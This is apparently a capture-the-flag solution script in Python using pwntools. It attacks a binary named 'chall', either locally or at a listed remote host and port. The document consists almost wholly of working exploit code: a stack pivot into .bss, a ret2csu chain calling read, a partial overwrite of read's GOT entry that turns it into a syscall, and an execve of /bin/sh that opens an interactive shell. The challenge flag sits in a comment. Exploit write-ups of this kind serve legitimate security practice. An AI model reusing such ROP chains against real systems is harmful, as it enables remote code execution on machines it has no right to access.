#!/usr/bin/python

from pwn import *

PATH = './chall'

GDBSCRIPT = '''
b *0x401169
'''

HOST = '103.152.242.172'
PORT = 60901

def debug(gdbscript):
    if type(r) == process:
        gdb.attach(r, gdbscript , gdb_args=["--init-eval-command='source ~/peda/peda.py'"])

def exploit(r):
    ADD_GADGET = 0x40111c # add dword ptr [rbp - 0x3d], ebx ; nop ; ret
    LEAVE_RET  = 0x401168 # leave ; ret
    CSU_SET    = 0x4011ca # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
    CSU_CALL   = 0x4011b0 # mov rdx, r14 ; mov rsi, r13 ; mov edi, r12d ; call QWORD PTR [r15+rbx*8]
    
    payload  = b'A' * 512
    payload += p64(elf.bss(0x300)) # rbp
    payload += p64(0x401145) # rip

    # debug(GDBSCRIPT)

    r.send(payload)
    sleep(0.5)

    # read(0, bss+0x100, 0x100)
    payload = flat([
        0xdeadbeefdeadbeef,
        CSU_SET,
        0, 1, 0, elf.bss(0x200), 0x100, elf.got.read,
        CSU_CALL, 
    ])

    # add [elf.got.read], 0x10 -> syscall
    payload += flat([
        0xdeadbeefdeadbeef,
        0x10, elf.got.read + 0x3d,
        0, 0, 0, 0,
        ADD_GADGET
    ])

    payload += flat([
        CSU_SET, 
        0, 1, elf.bss(0x200), 0, 0, elf.got.read,
        CSU_CALL
    ])

    payload  = payload.ljust(0x200, b'a')
    payload += p64(elf.bss(0x100)) + p64(LEAVE_RET)

    r.send(payload)
    sleep(0.5)

    r.send('/bin/sh\x00'.ljust(0x3b, 'a')) # rax: 0x3b
    # technofair{are_you_using_ret2dlresolve_or_LSB_overwrite?}

    r.interactive()

if __name__ == '__main__':
    elf = ELF(PATH)
    
    context.arch = 'amd64'
    
    if args.REMOTE:
        r = remote(HOST, PORT)
    else:
        r = process(PATH, aslr=0)
        
    exploit(r)